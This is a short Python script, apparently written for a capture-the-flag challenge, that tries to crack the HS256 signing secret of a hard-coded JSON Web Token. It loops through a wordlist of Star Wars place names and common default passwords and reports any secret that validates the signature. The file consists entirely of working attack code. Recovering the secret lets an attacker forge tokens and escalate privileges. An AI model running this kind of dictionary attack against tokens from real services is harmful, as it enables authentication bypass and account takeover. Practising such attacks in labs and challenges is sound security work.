import jwt
import sys

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJwYWRhd2FuIiwibWlkaWNobG9yaWFuX2xldmVsIjo1MDAwLCJpYXQiOjE3NjgwNDY5NjMsImV4cCI6MTc2ODA1MDU2M30.qA5RRadtIuko72G1mrcL0rNQ_rD-qqrSlK5ne9gqXZs"

candidates = [
    "dagobah", "Dagobah", "DAGOBAH",
    "swamp", "Swamp", "SWAMP",
    "naboo", "Naboo", "NABOO",
    "endor", "Endor", "ENDOR",
    "hoth", "Hoth", "HOTH",
    "yavin", "Yavin", "YAVIN",
    "jakku", "Jakku", "JAKKU",
    "force", "jedi", "sith", "yoda", "luke",
    "coruscant", "tatooine", "alderaan",
    "kamino", "geonosis", "mustafar",
    "bespin", "kashyyyk",
    "admin", "secret", "password", "12345",
    "whatever", "WHATEVER", "Whatever",
    "test", "TEST", "Test",
    "changeme", "CHANGEME",
    "node", "js", "javascript",
    "chal", "challenge", "ctf",
    "*****"
]

print("[*] Cracking JWT secret...")

for secret in candidates:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] FOUND SECRET: {secret}")
        sys.exit(0)
    except jwt.InvalidSignatureError:
        continue
    except Exception as e:
        print(f"[-] Error with {secret}: {e}")

print("[-] Failed to find secret in list.")
